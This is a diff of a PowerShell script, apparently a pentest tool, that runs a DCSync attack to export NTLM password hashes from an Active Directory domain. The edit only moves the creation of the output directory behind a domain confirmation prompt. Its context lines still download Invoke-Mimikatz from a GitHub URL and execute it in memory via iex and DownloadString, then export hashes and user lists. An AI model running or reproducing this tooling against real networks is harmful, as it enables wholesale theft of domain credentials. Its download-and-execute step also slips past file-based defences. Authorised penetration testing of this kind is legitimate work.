@@ -9,10 +9,6 @@ $HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes" + $EXT
 $USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
 $IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT
 
-# create directory for storage
-Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
-New-Item -ItemType Directory -Force -Path $PATH | Out-Null
-
 # download mimikatz into memory
 Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')
@@ -27,6 +23,11 @@ Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundC
 
 $confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
 if ($confirmation -eq 'y') {
+
+    # create directory for storage
+    Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
+    New-Item -ItemType Directory -Force -Path $PATH | Out-Null
+    
     # execute DCSync to export NT-Hashes
     Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
     Write-Host "    >" $LOG -ForegroundColor Gray
@@ -67,5 +68,4 @@ if ($confirmation -eq 'y') {
     Write-Host ""
 }else{
     Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 21)." -ForegroundColor Red
-    Remove-Item -LiteralPath $PATH -Force -Recurse
 }
